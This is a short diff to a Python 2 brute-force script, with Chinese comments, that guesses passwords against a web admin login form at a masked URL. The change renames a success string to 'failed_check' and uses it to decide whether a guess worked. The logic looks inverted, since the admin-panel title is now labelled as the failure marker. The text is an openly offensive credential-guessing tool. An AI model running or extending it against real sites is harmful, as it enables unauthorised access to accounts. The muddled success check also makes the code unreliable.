@@ -24,7 +24,7 @@ target_post="http://www.*******.com/auth"
 username_field="username"
 password_field="password"
 
-success_check="Administration - Control Panel"
+failed_check="Administration - Control Panel"
 #爆破总类
 class Bruter(object):
     """docstring for Bruter"""
@@ -68,7 +68,7 @@ class Bruter(object):
             #读取响应
             login_result=login_response.read()
             #找到成功与失败的差异，由此判断是否成功
-            if 'failure' not in login_result:
+            if failed_check not in login_result:
                 self.found=True
 
                 print '[*] Bruteforce successful'
